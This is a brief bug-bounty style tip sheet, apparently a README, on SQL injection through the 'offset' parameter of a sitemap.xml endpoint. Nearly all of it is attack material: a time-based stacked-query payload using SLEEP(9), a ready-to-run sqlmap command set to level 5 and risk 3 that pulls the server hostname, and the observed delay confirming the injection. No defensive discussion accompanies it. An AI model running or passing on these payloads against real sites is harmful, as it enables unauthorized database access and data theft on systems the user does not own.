# Tips-TRick
----------------------------------------------------------------------------------------------------------
SQL Injection On **sitemap.xml** endpoint

A -  target[.]com/sitemap.xml?offset=1;SELECT IF((8303>8302),SLEEP(9),2356)#
B -  sqlmap -u "target/sitemap.xml?offset=1" -p offset --level 5 --risk 3 --dbms=MySQL --hostname --test-filter="MySQL >= 5.0.12 stacked queries"

sleep payload 
[1;SELECT IF((8303>8302),SLEEP(9),2356)#] = 9s

---------------------------------------------------------------------------------------------

